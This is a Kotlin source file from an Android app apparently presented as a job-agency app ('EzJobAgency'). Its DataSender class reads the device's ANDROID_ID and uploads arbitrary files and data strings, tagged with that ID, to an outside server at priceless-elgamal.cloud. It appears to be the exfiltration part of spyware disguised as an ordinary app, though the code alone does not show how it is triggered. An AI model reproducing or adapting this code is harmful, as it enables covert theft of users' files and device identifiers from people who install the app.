package com.example.EzJobAgency

import android.content.ContentResolver
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class DataSender : AppCompatActivity(){
    private val client = OkHttpClient()
    private var androidId: String = ""

    fun obtainAndroidID(contentResolver : ContentResolver) {
        this.androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    fun getAndroidID(): String {
        return this.androidId
    }

    fun sendFile(filepath: String) {
        val url = "https://www.priceless-elgamal.cloud/receivefile.php"
        val file = File(filepath)
        val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, fileBody)
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        // Call the function from a coroutine
        lifecycleScope.launch {
            try {
                handleRequest(request)
                print(request)
            } catch (e: Exception) {
                Log.e("Error:", "Failed to send file.", e)
            }
        }
    }

    fun sendData(data: String) {
        val url = "https://www.priceless-elgamal.cloud/dbconfig.php"
                val formBody = FormBody.Builder()
                    .add("id", this.androidId)
                    .add("data", data)
                    .build()
                val request = Request.Builder().url(url).post(formBody).build()

                // Call the function from a coroutine
                lifecycleScope.launch {
                    try {
                        handleRequest(request)
                    } catch (e: Exception) {
                        Log.e("Error:", "Failed to send data.", e)
                    }
                }
    }

    private fun handleRequest(request: Request) {
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                // Handle the error here by printing it
                println("Error: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                // Handle the response here
                print(response)
                println(response.body?.string())
            }
        })
    }
}